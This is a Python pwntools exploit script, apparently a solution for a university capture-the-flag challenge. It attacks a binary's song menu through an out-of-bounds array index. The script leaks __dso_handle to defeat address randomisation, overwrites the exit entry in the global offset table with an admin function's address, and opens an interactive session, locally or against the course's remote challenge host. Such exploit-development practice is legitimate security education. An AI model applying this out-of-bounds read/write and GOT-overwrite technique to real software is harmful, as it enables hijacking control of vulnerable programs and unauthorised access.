from pwn import *

binary = "./chal.bin"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break menu
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    if args.REMOTE:
        return remote("cse4850-oob-1.chals.io", 443, ssl=True, sni="cse4850-oob-1.chals.io")
    return process(e.path)

def find_base(p):
    log.info("Determining the base address...")
    diff = (e.sym['__dso_handle'] - e.sym['songs'])//8
    log.info(f"Using offset {diff}")
    p.sendlineafter(b"[0-3] >>>", str(diff).encode('utf-8'))
    p.recvuntil(f"#{diff}: 0x".encode('utf-8'))
    leak = int(p.recv(12), 16)
    p.sendlineafter(f"#{diff} >>>".encode('utf-8'), p64(leak))
    return leak - e.sym['__dso_handle']

def overwrite_plt(p):
    log.info("Overwriting plt...")
    offset = (e.got['exit'] - e.sym['songs'])//8
    log.info(f"Using offset {offset}")
    admin = e.sym['admin']
    p.sendlineafter(b"[0-3] >>>", str(offset).encode('utf-8'))
    p.sendlineafter(f"#{offset} >>>".encode('utf-8'), p64(admin))

p = start()

e.address = find_base(p)
log.info(f"Found base of binary at {hex(e.address)}")
pause()

overwrite_plt(p)
p.sendlineafter(b"[0-3] >>>", b"0")
p.interactive()